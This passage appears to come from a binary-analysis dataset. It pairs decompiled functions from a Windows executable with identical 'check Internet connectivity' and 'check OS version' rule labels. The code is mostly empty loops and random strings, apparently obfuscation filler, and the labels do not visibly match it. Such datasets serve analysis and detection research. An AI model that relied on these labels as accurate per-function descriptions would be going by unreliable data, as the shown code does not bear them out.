        "decompiled_code": "\nvoid __cdecl\nfcn.0041e010(uint arg_8h, uint arg_ch, uint noname_2, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_11h;\n    int32_t var_5h;\n    \n    for (stack0xfffffff8 = 0x3f; 0 < stack0xfffffff8; unique0x00007a80 = stack0xfffffff8 + -1) {\n    }\n    return;\n}\n",
        "token_count": 166
    },
    "0041e0bc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0041e0bc(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint var_114h;\n    uint var_fch;\n    uint var_e4h;\n    uint var_cbh;\n    uint var_adh;\n    uint var_91h;\n    uint var_75h;\n    uint var_59h;\n    uint var_3dh;\n    uint var_21h;\n    int32_t var_15h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_15h._0_1_ = 0;\n    fcn.00483110();\n    fcn.004b21e0(\"uqhfoajykjhkiyhgrqvnwdlnyazgzkuhlvlf\", &var_cbh);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"utpfshm\", &var_cbh + 1);\n    fcn.00483140();\n    stack0xffffffdc = *0x522d98;\n    fcn.00483110();\n    fcn.004b21e0(\"mmqdqpaxxxlgimzuwrsltkpvuzkrkwurvhpzcjdfgrlwehqkrpalkvbmlvflztbetldmltceugublsdfjtaxxgyxg\", \n                 &var_cbh + 2);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"mmqdqpaxxxlgimzuwrsltkpvuzkrkwurvhpzcjdfgrlwehqkrpalkvbmlvflztbetldmltceugublsdfjtaxxgyxg\", &var_adh);\n    fcn.00483110();\n    fcn.004b21e0(\"mmqdqpaxxxlgimzuwrsltkpvuzkrkwurvhpzcjdfgrlwehqkrpalkvbmlvflztbetldmltceugublsdfjtaxxgyxg\", &var_91h);\n    cVar1 = fcn.004c1070(&var_adh + 1, &var_cbh + 3);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 6; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"mmqdqpaxxxlgimzuwrsltkpvuzkrkwurvhpzcjdfgrlwehqkrpalkvbmlvflztbetldmltceugublsdfjtaxxgyxg\", &var_75h);\n    fcn.00483110();\n    fcn.004b21e0(\"mmqdqpaxxxlgimzuwrsltkpvuzkrkwurvhpzcjdfgrlwehqkrpalkvbmlvflztbetldmltceugublsdfjtaxxgyxg\", &var_59h);\n    cVar1 = fcn.004c09a0(&var_75h + 1, &var_91h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_10h = 0x11; 0 < var_10h; var_10h = var_10h + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"utpfshm\", &var_3dh);\n    fcn.00483110();\n    fcn.004b21e0(\"utpfshm\", &var_21h);\n    cVar1 = fcn.004c1070(&var_3dh + 1, &var_59h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (stack0xffffffe8 = 0xc; 0 < stack0xffffffe8; unique0x00007a80 = stack0xffffffe8 + -1) {\n        }\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    return 1;\n}\n",
        "token_count": 1097
    },
    "0041e4cc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0041e4cc(uint noname_0, uint noname_1, uint noname_2, uint arg_14h, uint arg_18h)\n\n{\n    char cVar1;\n    uint in_ECX;\n    uint var_98h;\n    uint var_94h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_70h;\n    uint var_56h;\n    uint var_39h;\n    uchar var_1fh;\n    uchar var_1eh;\n    uchar var_1dh;\n    uint var_1ch;\n    uint var_18h;\n    uchar var_13h;\n    uchar var_12h;\n    int32_t var_11h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_11h._0_1_ = 1;\n    var_12h = 1;\n    var_13h = 0;\n    fcn.00483110();\n    fcn.004b21e0(\"iadwob\", &var_56h);\n    fcn.00483140();\n    var_18h = 0x671;\n    fcn.00483110();\n    fcn.004b21e0(\"rkqtlyalvwoikndunfkjmgzedqgyksbthzfbfbzhzkokzfoveguedo\", &var_56h + 1);\n    fcn.00483140();\n    var_1ch = 0x91a;\n    var_1dh = 1;\n    fcn.00483110();\n    fcn.004b21e0(\"rkqtlyalvwoikndunfkjmgzedqgyksbthzfbfbzhzkokzfoveguedo\", &var_39h);\n    fcn.00483110();\n    fcn.004b21e0(\"rkqtlyalvwoikndunfkjmgzedqgyksbthzfbfbzhzkokzfoveguedo\", &var_1fh);\n    cVar1 = fcn.004c09a0(&var_39h + 1, &var_56h + 2);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 0x47; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    for (stack0xffffffec = 0xb; 0 < stack0xffffffec; unique0x00007a80 = stack0xffffffec + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"rgnlmh\", &var_1eh);\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.004b2800();\n    return in_ECX;\n}\n",
        "token_count": 688
    },
    "0041e804": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0041e804(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint in_ECX;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_5ch;\n    uint var_44h;\n    uchar var_2ch;\n    uchar var_2bh;\n    uchar var_2ah;\n    uint var_29h;\n    ulong uStack36;\n    int32_t var_15h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_15h._0_1_ = 0;\n    uStack36 = *0x522da8;\n    stack0xffffffd4 = *0x522db0;\n    var_29h._0_1_ = 0;\n    fcn.00483110();\n    fcn.004b21e0(\"oytbmmjtbcjssddizkhhximbiohahhyctuvpfoixtwmebitnkyk\", &var_2ch);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"numirshsqvxfhxpiezvedealyil\", &var_2bh);\n    fcn.00483140();\n    for (var_ch = 0x5a; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    for (var_10h = 0x24; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    for (stack0xffffffe8 = 0x25; 0 < stack0xffffffe8; unique0x00007a80 = stack0xffffffe8 + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"hehbumiswnargc\", &var_2ah);\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.004b2800();\n    return in_ECX;\n}\n",
        "token_count": 538
    },
    "0041e980": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 fcn.0041e980(void)\n\n{\n    double dVar1;\n    char cVar2;\n    uint var_9ch;\n    uint var_8ch;\n    uint var_74h;\n    uint var_5ah;\n    uint var_3dh;\n    uchar var_22h;\n    uint var_21h;\n    uchar var_13h;\n    uchar var_12h;\n    int32_t var_11h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_11h._0_1_ = 1;\n    fcn.00483110();\n    fcn.004b21e0(\"mxvgorqysclzaujnsknesfozqurdkgb\", &var_5ah);\n    fcn.00483140();\n    var_12h = 1;\n    fcn.00483110();\n    fcn.004b21e0(\"zesyatsknqiafpcevwedujdpwfehggmpypdmtefhpoonaafutycaqpxrcbvgshptmpvouhlcogqhukhqxir\", &var_5ah + 1);\n    fcn.00483140();\n    var_13h = 0;\n    stack0xffffffdc = *0x522db8;\n    var_21h._0_1_ = 0;\n    fcn.00483110();\n    fcn.004b21e0(\"zesyatsknqiafpcevwedujdpwfehggmpypdmtefhpoonaafutycaqpxrcbvgshptmpvouhlcogqhukhqxir\", &var_3dh);\n    fcn.00483110();\n    fcn.004b21e0(\"zesyatsknqiafpcevwedujdpwfehggmpypdmtefhpoonaafutycaqpxrcbvgshptmpvouhlcogqhukhqxir\", &var_22h);\n    cVar2 = fcn.004c1070(&var_3dh + 1, &var_5ah + 2);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    dVar1 = *0x522dc0;\n    if (cVar2 != '\\0') {\n        for (var_ch = 0x5f; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    for (stack0xffffffec = 8; 0 < stack0xffffffec; unique0x00007a80 = stack0xffffffec + -1) {\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    return dVar1;\n}\n",
        "token_count": 650
    },
    "0041eb58": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041eb58(uint noname_0, uint noname_1, uint arg_10h, uint arg_14h)\n\n{\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    int32_t var_9h;\n    int32_t var_4h;\n    \n    for (var_4h = 0x3e; 0 < var_4h; var_4h = var_4h + -1) {\n    }\n    for (stack0xfffffff4 = 0x53; 0 < stack0xfffffff4; unique0x00007a80 = stack0xfffffff4 + -1) {\n    }\n    return 1;\n}\n",
        "token_count": 184
    },
    "0041ebce": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nfloat10 __cdecl\nfcn.0041ebce(uint noname_0, uint arg_ch, uint arg_10h, uint noname_3, uint arg_18h, uint noname_5, uint noname_6, \n            uint noname_7, uint arg_28h, uint arg_2ch)\n\n{\n    double dVar1;\n    char cVar2;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_a0h;\n    uint var_86h;\n    uint var_69h;\n    uint var_4dh;\n    uint var_31h;\n    uchar var_15h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"oxfgoatcetxvdywyuvkyqfmmftroxnsbmt\", &var_86h);\n    fcn.00483140();\n    var_14h = 0x127d;\n    fcn.00483110();\n    fcn.004b21e0(\"tovxwlxroxpytlaltwbgx\", &var_86h + 1);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"oxfgoatcetxvdywyuvkyqfmmftroxnsbmt\", &var_69h);\n    fcn.00483110();\n    fcn.004b21e0(\"oxfgoatcetxvdywyuvkyqfmmftroxnsbmt\", &var_4dh);\n    cVar2 = fcn.004c1070(&var_69h + 1, &var_86h + 2);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar2 != '\\0') {\n        for (var_ch = 0x35; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"oxfgoatcetxvdywyuvkyqfmmftroxnsbmt\", &var_31h);\n    fcn.00483110();\n    fcn.004b21e0(\"oxfgoatcetxvdywyuvkyqfmmftroxnsbmt\", &var_15h);\n    cVar2 = fcn.004c09a0(&var_31h + 1, &var_4dh + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    dVar1 = *0x522dd8;\n    if (cVar2 != '\\0') {\n        for (var_10h = 0x4c; 0 < var_10h; var_10h = var_10h + -1) {\n        }\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    return dVar1;\n}\n",
        "token_count": 775
    },
    "0041eea2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0041eea2(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint noname_7, uint arg_28h, uint arg_2ch, uint arg_30h, uint noname_11, uint noname_12, uint arg_3ch, \n            uint arg_40h)\n\n{\n    char cVar1;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_74h;\n    uint var_59h;\n    uint var_3dh;\n    uchar var_22h;\n    uint var_21h;\n    uint var_18h;\n    int32_t var_11h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_11h._0_1_ = 0;\n    var_18h = 0xc18;\n    stack0xffffffdc = *0x522de0;\n    fcn.00483110();\n    fcn.004b21e0(\"uqavfuvhvygwyzihftfkykdayknrthtadvluspjwsmjtotvgyzdegmgmrkjxocqsayzzvdip\", &var_59h);\n    fcn.00483140();\n    var_21h._0_1_ = 1;\n    fcn.00483110();\n    fcn.004b21e0(\"uqavfuvhvygwyzihftfkykdayknrthtadvluspjwsmjtotvgyzdegmgmrkjxocqsayzzvdip\", &var_3dh);\n    fcn.00483110();\n    fcn.004b21e0(\"uqavfuvhvygwyzihftfkykdayknrthtadvluspjwsmjtotvgyzdegmgmrkjxocqsayzzvdip\", &var_22h);\n    cVar1 = fcn.004c09a0(&var_3dh + 1, &var_59h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 0x46; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    for (stack0xffffffec = 0x42; 0 < stack0xffffffec; unique0x00007a80 = stack0xffffffec + -1) {\n    }\n    fcn.004b2800();\n    return;\n}\n",
        "token_count": 712
    },
    "0041f076": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 __cdecl fcn.0041f076(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    double dVar1;\n    char cVar2;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b0h;\n    uint var_98h;\n    uint var_7eh;\n    uint var_61h;\n    uchar var_45h;\n    uint var_44h;\n    ulong uStack68;\n    uint var_34h;\n    ulong uStack52;\n    uint var_28h;\n    uchar var_21h;\n    uint var_20h;\n    int32_t var_19h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_19h._0_1_ = 1;\n    var_20h = 0x202e;\n    var_21h = 1;\n    var_28h = 0x572;\n    uStack52 = *0x522de8;\n    fcn.00483110();\n    fcn.004b21e0(\"yldrppeewogkgxzeozozoyehfcoopjhefvmddwymxjtanuvwbjvrsntvjzyplhkbbjihiacqwbyfldvtmkwmskniznzadqrsap\", \n                 &var_7eh);\n    fcn.00483140();\n    var_34h = 0xf21;\n    uStack68 = *0x522df0;\n    fcn.00483110();\n    fcn.004b21e0(\"ilxighqtzrypssechldunnzqvfxgtmvrjdgmzyzcsqriaazoippewazwmxhjngwvzncygmpumtpxwvhxqjacuqhzdoc\", \n                 &var_7eh + 1);\n    fcn.00483140();\n    var_44h = 0x7eb;\n    for (var_ch = 0xc; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"yldrppeewogkgxzeozozoyehfcoopjhefvmddwymxjtanuvwbjvrsntvjzyplhkbbjihiacqwbyfldvtmkwmskniznzadqrsap\", \n                 &var_61h);\n    fcn.00483110();\n    fcn.004b21e0(\"yldrppeewogkgxzeozozoyehfcoopjhefvmddwymxjtanuvwbjvrsntvjzyplhkbbjihiacqwbyfldvtmkwmskniznzadqrsap\", \n                 &var_45h);\n    cVar2 = fcn.004c1070(&var_61h + 1, &var_7eh + 2);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    dVar1 = *0x522df8;\n    if (cVar2 != '\\0') {\n        for (var_10h = 0x22; 0 < var_10h; var_10h = var_10h + -1) {\n        }\n    }\n    for (var_14h = 0x5f; 0 < var_14h; var_14h = var_14h + -1) {\n    }\n    for (stack0xffffffe4 = 0x3a; 0 < stack0xffffffe4; unique0x00007a80 = stack0xffffffe4 + -1) {\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    return dVar1;\n}\n",
        "token_count": 917
    },
    "0041f2b6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041f2b6(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    uint var_50h;\n    uint var_4ch;\n    uint var_44h;\n    uint var_39h;\n    uint var_20h;\n    uint var_19h;\n    int32_t var_5h;\n    \n    for (stack0xfffffff8 = 3; 0 < stack0xfffffff8; unique0x00007a80 = stack0xfffffff8 + -1) {\n    }\n    return;\n}\n",
        "token_count": 127
    },
    "0041f324": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041f324(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_21h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    for (var_4h = 0x2b; 0 < var_4h; var_4h = var_4h + -1) {\n    }\n    for (var_8h = 0x11; 0 < var_8h; var_8h = var_8h + -1) {\n    }\n    for (var_ch = 0x28; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    for (var_10h = 0x4c; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    return 0x5a2f;\n}\n",
        "token_count": 290
    },
    "0041f3ce": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nuint __cdecl\nfcn.0041f3ce(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint arg_2ch)\n\n{\n    char cVar1;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_cch;\n    uint var_b4h;\n    uint var_9ch;\n    uint var_84h;\n    uint var_6ch;\n    uchar var_68h [27];\n    uint var_4dh;\n    uint var_31h;\n    uchar var_25h;\n    uint var_24h;\n    ulong uStack36;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_10h = 0xbb;\n    var_14h = 0x1a8f;\n    fcn.00483110();\n    fcn.004b21e0(\"ehikqmubkgjmlmyepwzwudqkxdmhoudumxmlhydcoryaxauzdmzjareniiaadkqncawddmprxddzpaf\", &var_6ch);\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"pfueevfataetjceuhdkmlxlyocvexoisfspbsikmtwylrveyrrovalgvmsmokauoiquutzxur\", &var_6ch + 1);\n    fcn.00483140();\n    uStack36 = *0x522e38;\n    fcn.00483110();\n    fcn.004b21e0(\"nxbewfkclnstzunnmjfy\", &var_6ch + 2);\n    fcn.00483140();\n    var_24h = 0x11cc;\n    var_25h = 1;\n    stack0xffffffcc = *0x522e40;\n    fcn.00483110();\n    fcn.004b21e0(\"ikbqlewawgkybtzjmsdaphpijjqspnsaqytqrqybjpgliscxwnhsddrxediibwurrpiarfieprxjjbootnwrmpl\", &var_6ch + 3\n                );\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"nxbewfkclnstzunnmjfy\", &var_4dh);\n    fcn.00483110();\n    fcn.004b21e0(\"nxbewfkclnstzunnmjfy\", &var_31h);\n    cVar1 = fcn.004c09a0(&var_4dh + 1, var_68h);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar1 != '\\0') {\n        for (var_ch = 0x39; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.004b2800();\n    return 0x53b0;\n}\n",
        "token_count": 808
    },
    "0041f68c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nfloat10 __cdecl\nfcn.0041f68c(uint noname_0, uint noname_1, uint arg_10h, uint arg_14h, uint noname_4, uint arg_1ch, uint arg_20h)\n\n{\n    double dVar1;\n    char cVar2;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_8dh;\n    uint var_71h;\n    uint var_55h;\n    uint var_39h;\n    uchar var_1dh;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_18h = 7;\n    fcn.00483110();\n    fcn.004b21e0(\"zkqtjtwftzqfehflxeraqzuvxfrgiovpeifldwoegqijodgqdovkhlccgzvqpqppjuwyjeg\", &var_8dh);\n    fcn.00483140();\n    var_1ch = 0xc86;\n    fcn.00483110();\n    fcn.004b21e0(\"zkqtjtwftzqfehflxeraqzuvxfrgiovpeifldwoegqijodgqdovkhlccgzvqpqppjuwyjeg\", &var_71h);\n    fcn.00483110();\n    fcn.004b21e0(\"zkqtjtwftzqfehflxeraqzuvxfrgiovpeifldwoegqijodgqdovkhlccgzvqpqppjuwyjeg\", &var_55h);\n    cVar2 = fcn.004c09a0(&var_71h + 1, &var_8dh + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar2 != '\\0') {\n        for (var_ch = 0x1b; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    for (var_10h = 0x1b; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    fcn.00483110();\n    fcn.004b21e0(\"zkqtjtwftzqfehflxeraqzuvxfrgiovpeifldwoegqijodgqdovkhlccgzvqpqppjuwyjeg\", &var_39h);\n    fcn.00483110();\n    fcn.004b21e0(\"zkqtjtwftzqfehflxeraqzuvxfrgiovpeifldwoegqijodgqdovkhlccgzvqpqppjuwyjeg\", &var_1dh);\n    cVar2 = fcn.004c09a0(&var_39h + 1, &var_55h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    dVar1 = *0x522e48;\n    if (cVar2 != '\\0') {\n        for (var_14h = 0x48; 0 < var_14h; var_14h = var_14h + -1) {\n        }\n    }\n    fcn.004b2800();\n    return dVar1;\n}\n",
        "token_count": 860
    },
    "0041fa32": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nfloat10 __cdecl fcn.0041fa32(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    double dVar1;\n    char cVar2;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_9dh;\n    uint var_81h;\n    uint var_65h;\n    uint var_49h;\n    uchar var_2dh;\n    uint var_2ch;\n    ulong uStack44;\n    uint var_20h;\n    uchar var_19h;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_bp_4h;\n    \n    var_18h = 0x827;\n    var_19h = 1;\n    var_20h = 0x8f;\n    uStack44 = *0x522e50;\n    fcn.00483110();\n    fcn.004b21e0(0x51e844, &var_9dh);\n    fcn.00483140();\n    var_2ch = 0x2df;\n    fcn.00483110();\n    fcn.004b21e0(0x51e844, &var_81h);\n    fcn.00483110();\n    fcn.004b21e0(0x51e844, &var_65h);\n    cVar2 = fcn.004c1070(&var_81h + 1, &var_9dh + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    if (cVar2 != '\\0') {\n        for (var_ch = 0x15; 0 < var_ch; var_ch = var_ch + -1) {\n        }\n    }\n    fcn.00483110();\n    fcn.004b21e0(0x51e844, &var_49h);\n    fcn.00483110();\n    fcn.004b21e0(0x51e844, &var_2dh);\n    cVar2 = fcn.004c09a0(&var_49h + 1, &var_65h + 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    dVar1 = *0x522e58;\n    if (cVar2 != '\\0') {\n        for (var_10h = 0x39; 0 < var_10h; var_10h = var_10h + -1) {\n        }\n    }\n    for (var_14h = 0x1c; 0 < var_14h; var_14h = var_14h + -1) {\n    }\n    fcn.004b2800();\n    return dVar1;\n}\n",
        "token_count": 708
    },
    "0041fcfa": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
